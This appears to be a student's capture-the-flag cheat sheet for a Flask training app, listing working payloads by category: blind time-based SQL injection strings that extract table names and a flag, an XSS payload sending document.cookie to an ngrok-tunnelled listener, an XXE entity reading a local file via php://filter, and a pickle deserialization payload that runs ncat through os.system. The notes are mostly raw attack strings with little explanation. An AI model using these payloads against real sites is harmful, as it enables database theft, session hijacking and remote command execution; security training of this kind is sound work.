Flask
SQL
----------
' or 1=1; -- 

SQL Timing Based
--------------
https://www.youtube.com/watch?v=DYLDG_2Vs3E
https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
"' or ((SELECT hex(substr(table_name,{},1)) FROM information_schema.tables limit 1 offset 0)=hex('{}') and 1=1-SLEEP(2)) -- ".format(len(known_data)+1, x)
"' or ((SELECT hex(substr(column_name,{},1)) FROM information_schema.columns where table_name = 'supersecrettable' limit 1 offset 0)=hex('{}') and 1=1-SLEEP(2)) -- "
"user_name": "' or ((SELECT hex(substr(flag,{},1)) FROM supersecrettable limit 1 offset 0)=hex('{}') and 1=1-SLEEP(2)) -- "

NoSQL Blind injection
---------------------
https://www.youtube.com/watch?v=7kmttmmlygc
https://cloud.mongodb.com/v2/601b09a6a1838475f9393a92#metrics/replicaSet/622b90aef64b734b93ba453d/explorer/CTF/users/find
Refer to script

XSS
---------
ncat -klnvp 9000
ngrok http 9000
<script>document.write('<img src="http://340b-2406-3003-2077-4ea9-85b2-4692-1458-96f8.ngrok.io?cookie='+btoa(document.cookie)+'" />');</script>
curl -H "Cookie: token=8abae5d8bc89622b6bf5a76c948312f2" http://127.0.0.1:5000/XSS/admin

XSS with Content Security Policy
---------
<iframe src="http://localhost/CTF/attacker/base.html"></iframe>

XSS
-----------------



XML Blind injection
----------------------------
https://www.youtube.com/watch?v=ySJwlMsFbco
Refer to script


XXE injection
------------------------
https://www.youtube.com/watch?v=kiGoOuuXWFI

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <food>
    <name>Tonkatsu &example;</name> 
    <toppings>Add Ajitama</toppings> 
    <optional>Add Beef</optional></food>

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://localhost:5000/XXE/flag" >
]>
<food>
    <name>Tonkatsu &xxe;</name> 
    <toppings>Add Ajitama</toppings> 
    <optional>Add Beef</optional></food>


Pickle Insecure Deserialization
---------------------------
Refer to script
ncat -klnvp 9000
curl -d "function=decode&input=\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x13ncat 127.0.0.1 9000\x94\x85\x94R\x94." http://127.0.0.1:5000/INSEC/





